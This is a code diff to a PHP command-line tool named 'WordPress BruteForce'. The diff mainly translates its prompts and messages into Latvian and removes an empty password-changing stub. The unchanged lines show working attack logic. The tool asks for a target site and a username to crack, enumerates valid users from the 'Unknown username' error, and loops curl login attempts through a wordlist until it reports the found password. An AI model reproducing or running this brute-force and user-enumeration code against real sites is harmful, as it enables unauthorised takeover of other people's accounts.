@@ -1,3 +1,4 @@
+#!/usr/bin/env php
 <?php
     /**
      * @package WordPress BruteForce
@@ -61,21 +62,21 @@
          * @return void
          */
         private function read(){
-            $filename               = readline('Type wordlist path (empty for default): ');
+            $filename               = readline('Ievadi ceļu uz vārdnīcu (Atstāj tukšu - noklusējuma): ');
             if ($filename && file_exists($filename)){ // custom wordlist
                 $this->fileName     = basename($filename);
-                print               "\033[35m[~] Loading {$this->fileName} wordlist, please wait...\033[0m\n";
+                print               "\033[35m[~] Notiek vārdnīcas  {$this->fileName} ielāde, lūdzu uzgaidiet...\033[0m\n";
                 $this->file         = fopen($filename, 'r');
-                print               "\033[32m{$this->fileName} loaded successfuly...\033[0m\n";
+                print               "\033[32m{$this->fileName} ielādēts veiksmīgi...\033[0m\n";
             } else { // default wordlist
                 $this->fileName     = basename($this->default);
-                print               "\033[35m[~] Loading {$this->fileName} wordlist, please wait...\033[0m\n";
+                print               "\033[35m[~] Notiek vārdnīcas {$this->fileName} ielāde, lūdzu uzgaidiet...\033[0m\n";
                 if (file_exists($this->default)){
                     $this->file     = fopen($this->default, 'r');
-                    print           "\033[32m{$this->fileName} loaded successfuly...\033[0m\n";
+                    print           "\033[32m{$this->fileName} ielādēts veiksmīgi...\033[0m\n";
                 } else {
                     $filename       = basename($this->default);
-                    print           "\033[31m[!] WordList {$filename} not found...\033[0m\n";
+                    print           "\033[31m[!] Vārdnīca {$filename} nav atrasta...\033[0m\n";
                     exit;
                 }
             }
@@ -100,13 +101,13 @@
          * @return void
          */
         private function setUrl(){
-            $url            = readline('Type WP Site Login: ');
+            $url            = readline('Ievadi WordPress lapas saiti: ');
             $this->url      = $url;
             $alive          = @file_get_contents($this->url);
             if(empty($alive)){
                 print       "\033[31m***\n";
-                print       "* Website is not alive !!!\n";
-                print       "* Check website url and try again...\n";
+                print       "* Lapa nav sasniedzama !!!\n";
+                print       "* Pārliecinies, vai uzrakstīji saiti pareizi...\n";
                 print       "***\033[0m\n";
                 exit;
             } else $this->checkWP();
@@ -117,10 +118,10 @@
          * @return void
          */
         private function setUser(){
-            $username       = readline('Type username to bruteforce: ');
+            $username       = readline('Ievadi lietotājvārdu, kuru vēlies uzlaust: ');
             if (empty($username)){
                 print       "\033[31m***\n";
-                print       "* Please type username !!!\n";
+                print       "* Ievadi lietotājvārdu !!!\n";
                 print       "***\033[0m\n";
                 return $this->setUser();
             } else {
@@ -136,7 +137,7 @@
                 curl_close($curl);
                 if (strpos($result, 'Unknown username')){
                     print   "\033[31m***\n";
-                    print   "* User '{$username}' doesn't exists !!!\n";
+                    print   "* Lietotājs '{$username}' neeksistē !!!\n";
                     print   "***\033[0m\n";
                     return $this->setUser();
                 } else $this->user = $username;
@@ -163,33 +164,22 @@
                     ]);
                     $result = curl_exec($curl);
                     if (strpos($result, '<div id="login_error">')){
-                        print   "\033[34m[~] Testing password {$pass}, #{$passwords_test} incorrect..\033[0m\n";
+                        print   "\033[34m[~] Mēģina paroli {$pass}, #{$passwords_test} nav pareiza..\033[0m\n";
                     } else {
                         $finish         = time() - $start_time;
                         $minutes        = round($finish / 60);
                         $seconds        = round($finish % 60);
                         print           "\033[32m***\n";
-                        print           "* PASSWORD FOUND !!!\n*\n";
+                        print           "* PAROLE ATRASTA !!!\n*\n";
                         print           "* {$pass}:" . MD5($pass) . "\n";
-                        print           "* Elapsed time: {$minutes}min. & {$seconds}sec.\n";
-                        print           "* Total {$passwords_test} passwords tested\n";
+                        print           "* Pagājušais laiks: {$minutes}min. & {$seconds}sec.\n";
+                        print           "* Kopā tika izmēģinātas {$passwords_test} paroles\n";
                         print           "***\033[0m\n";
                         $this->bruteForce = False;
                         break;break;
                     }
                 }
             }
-        }
-        /**
-         * Changing user password // varbūt kaut kādā nākotnē būs!!!
-         * Gaļax čakarēties... 
-         * https://simplehtmldom.sourceforge.io/
-         * 
-         * @return void
-         * 
-         */
-        private function changePassword(){
-            return;
         }
     }
 
